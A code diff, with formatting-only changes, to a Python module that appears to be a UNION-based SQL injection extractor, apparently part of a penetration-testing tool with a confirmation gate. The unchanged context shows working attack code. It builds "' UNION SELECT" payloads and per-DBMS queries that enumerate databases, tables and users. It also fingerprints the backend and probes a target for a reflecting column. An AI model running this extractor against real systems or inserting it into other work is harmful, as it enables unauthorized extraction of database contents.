@@ -94,12 +94,8 @@ LIST_DATABASES_QUERIES: dict[str, str] = {
         f"GROUP_CONCAT(schema_name SEPARATOR '{GROUP_CONCAT_SEPARATOR}') "
         "FROM information_schema.schemata"
     ),
-    "postgres": (
-        f"string_agg(datname, '{GROUP_CONCAT_SEPARATOR}') FROM pg_database"
-    ),
-    "mssql": (
-        f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') FROM sys.databases"
-    ),
+    "postgres": (f"string_agg(datname, '{GROUP_CONCAT_SEPARATOR}') FROM pg_database"),
+    "mssql": (f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') FROM sys.databases"),
     "oracle": (
         f"LISTAGG(username, '{GROUP_CONCAT_SEPARATOR}') "
         "WITHIN GROUP (ORDER BY username) FROM all_users"
@@ -118,10 +114,7 @@ LIST_TABLES_QUERIES: dict[str, str] = {
         f"string_agg(tablename, '{GROUP_CONCAT_SEPARATOR}') "
         "FROM pg_tables WHERE schemaname = 'public'"
     ),
-    "mssql": (
-        f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') "
-        "FROM sys.tables"
-    ),
+    "mssql": (f"STRING_AGG(name, '{GROUP_CONCAT_SEPARATOR}') FROM sys.tables"),
     "oracle": (
         f"LISTAGG(table_name, '{GROUP_CONCAT_SEPARATOR}') "
         "WITHIN GROUP (ORDER BY table_name) FROM user_tables"
@@ -146,6 +139,7 @@ KILL_SIGNATURES = (
 # Result types
 # ---------------------------------------------------------------------------
 
+
 @dataclass
 class ExtractionStep:
     name: str
@@ -163,6 +157,7 @@ class ExtractionStep:
             "value": self.value,
             "error": self.error,
         }
+
 
 @dataclass
 class ExtractionResult:
@@ -197,15 +192,19 @@ class ExtractionResult:
             "total_requests": self.total_requests,
         }
 
+
 class AttackConfirmationRequired(Exception):  # noqa: N818
     """Raised when the extractor is invoked without confirmation."""
+
 
 class UnstableTargetError(Exception):
     """Raised when the target shows signs of instability."""
 
+
 # ---------------------------------------------------------------------------
 # URL / payload helpers
 # ---------------------------------------------------------------------------
+
 
 def build_url(base: str, param: str, value: str) -> str:
     parsed = urlparse(base)
@@ -221,6 +220,7 @@ def build_url(base: str, param: str, value: str) -> str:
             parsed.fragment,
         )
     )
+
 
 def build_union_payload(
     column_count: int,
@@ -241,6 +241,7 @@ def build_union_payload(
     terminator = COMMENT_TERMINATORS.get(dbms, "--")
     return "' UNION SELECT " + ", ".join(cols) + terminator
 
+
 def detect_dbms(text: str) -> str:
     low = (text or "").lower()
     for dbms, needles in DBMS_SIGNATURES.items():
@@ -249,15 +250,18 @@ def detect_dbms(text: str) -> str:
                 return dbms
     return "unknown"
 
+
 def split_concat(value: str) -> list[str]:
     if not value:
         return []
     parts = [p.strip() for p in value.split(GROUP_CONCAT_SEPARATOR)]
     return [p for p in parts if p]
 
+
 # ---------------------------------------------------------------------------
 # Extractor
 # ---------------------------------------------------------------------------
+
 
 class UnionExtractor:
     def __init__(
@@ -357,9 +361,7 @@ class UnionExtractor:
             body = r.text or ""
             if SENTINEL in body:
                 return col
-        raise RuntimeError(
-            f"no reflecting column found among {self.columns} columns"
-        )
+        raise RuntimeError(f"no reflecting column found among {self.columns} columns")
 
     # ------------------------------------------------------------------
 
@@ -414,6 +416,7 @@ class UnionExtractor:
         tokens = re.findall(r"[A-Za-z0-9._:/()~ -]{4,200}", text)
         if not tokens:
             return None
+
         def score(t: str) -> tuple:
             low = t.lower()
             dbms_hit = any(
@@ -467,9 +470,7 @@ class UnionExtractor:
             for candidate, expr in VERSION_QUERIES.items():
                 if candidate == "unknown":
                     continue
-                s = self.extract_expression(
-                    f"dbms_probe_{candidate}", expr, col
-                )
+                s = self.extract_expression(f"dbms_probe_{candidate}", expr, col)
                 if s.value:
                     result.version = s.value
                     result.dbms = detect_dbms(s.value) or candidate
